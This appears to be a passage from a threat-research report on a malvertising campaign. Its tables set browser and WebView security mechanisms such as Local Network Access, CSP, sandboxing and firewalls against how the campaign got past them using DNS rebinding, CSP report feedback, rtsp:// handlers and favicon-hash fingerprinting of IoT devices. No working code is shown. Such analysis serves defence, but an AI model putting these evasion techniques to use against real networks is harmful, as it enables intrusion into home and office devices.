| Local Network Access (LNA) | Prevents public websites from accessing local devices without permission. | Connection attempts may still reveal timing differences that allow probing of local devices. | Enforcement may vary depending on WebView engine version and host application configuration. |
| Sandboxing / SafeFrame | Restricts capabilities of embedded iframe content. | The attacker used multiple nested iframes and fallback navigation to trigger the attack despite restrictions. | Native code or navigation handlers in the host application may perform other actions on behalf of the iframe. |
| Content Security Policy (CSP) | Controls which resources a page can load. | The attacker intentionally triggered CSP violations and used the report-uri directive to receive feedback from the browser. | If native networking functions or JavaScript bridges exist, requests may be executed outside WebView CSP enforcement. |

## Slide 56

| **Security Mechanism** | **Intended Protection** | **Observed Behavior in the Campaign (Browser)** | **Observed Behavior in the Campaign (WebView)** |
|---|---|---|---|
| Frame Embedding Protections | Prevent unauthorized iframe embedding of sensitive pages. | The attacker loaded Google and Facebook endpoints in iframes to trigger blocking behavior and CSP reports, revealing login state. | Similar behavior applies, but WebView navigation handling by the host app may influence frame loading behavior. |
| Fetch Metadata Headers | Allow servers to detect cross-site requests. | Cross-site iframe requests triggered different redirect behaviors, which the attacker used to infer authentication status. | Same mechanism applies because WebView uses the underlying browser engine. |
| Protocol Handlers | Allow browsers to open applications for specific URL schemes. | The campaign triggered an `rtsp://` request to detect installed RTSP clients and fingerprint streaming configuration. | WebViews can trigger OS-level protocol handlers, launching apps capable of handling schemes such as `rtsp://.` |
| Firewall / VPN | Restrict external access to internal network resources. | The attack originated from the user's browser inside the network, allowing access to local services despite these protections. | Same behavior applies since WebView traffic originates from the device within the trusted network. |
| IoT Interface Exposure | Devices should limit exposed endpoints and avoid leaking identifying information. | After DNS rebinding, the attacker probed known IoT interface paths and analyzed responses to fingerprint the device and prepare further exploitation. | Same technique applies because the WebView can reach local network devices through the host app network context. |
| Favicon Fingerprinting | Devices should limit exposed endpoints and avoid leaking identifying information. | The script retrieved `/favicon.ico`, computed its hash, and compared it to a built-in hash table to identify the IoT device and guide further probing or exploitation. | Same technique applies because the WebView can reach local network devices through the host app network context. |
...
- Figure 6- Malicious Analyzer Script embedded in the ad. Target: mobile users in Germany and Switzerland — 10
...
- Figure 37- Wireshark, the DNS record of the 'control' subdomain. int32_IP is 3232235881 (192.168.1.105) — 27
- Figure 38- Wireshark, The DNS record of the iframe changed. Now resolve to 192.168.1.105, TTL is 5 seconds — 27
